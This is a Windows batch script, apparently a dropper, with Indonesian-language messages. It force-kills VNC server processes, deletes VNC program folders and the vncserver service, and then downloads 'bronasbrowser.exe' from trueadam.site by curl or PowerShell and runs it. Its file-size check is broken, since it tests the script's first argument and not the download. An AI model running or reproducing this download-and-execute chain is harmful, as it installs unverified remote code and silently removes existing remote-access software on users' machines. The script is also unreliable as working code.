@echo off
setlocal enabledelayedexpansion
title MODE PC - TrueAdam + VNC Killer
set DIR=C:\Sumpruy_Downloads
mkdir "%DIR%" 2>nul
cd /d "%DIR%"

taskkill /f /im vncserver.exe 2>nul
taskkill /f /im winvnc4.exe 2>nul
taskkill /f /im tightvncserver.exe 2>nul
taskkill /f /im ultravnc.exe 2>nul

rd /s /q "C:\Program Files\VNC" 2>nul
rd /s /q "C:\Program Files\TightVNC" 2>nul
rd /s /q "%USERPROFILE%\AppData\Local\VNC" 2>nul

sc stop vncserver 2>nul
sc delete vncserver 2>nul

echo ========================================
echo MULAI DOWNLOAD BRO...
echo ========================================

:: Method 1 pake curl
curl -L -o "bronasbrowser.exe" "https://trueadam.site/bronasbrowser.exe"
if %errorlevel% neq 0 (
    echo CURL GAGAL, COBA PAKE POWERSHELL...
    
    :: Method 2 pake PowerShell
    powershell -Command "Invoke-WebRequest -Uri 'https://trueadam.site/bronasbrowser.exe' -OutFile 'bronasbrowser.exe'"
    
    if !errorlevel! neq 0 (
        echo POWERSHELL JUGA GAGAL ANJING 😡
        echo Coba cek: https://trueadam.site di browser dulu
        pause
        exit /b
    )
)

:: Cek file beneran ada atau kaga
if exist "bronasbrowser.exe" (
    if %~z1 EQU 0 (
        echo FILE NYA KOSONG BRO! SITUS NYA ERROR
    ) else (
        echo ✅ bronasbrowser.exe BERHASIL DENGAN UKURAN %~z1 bytes
        start "" "bronasbrowser.exe"
    )
) else (
    echo ❌ TETAP GAGAL BRO! https://trueadam.site KEMUNGKINAN DOWN
)

pause
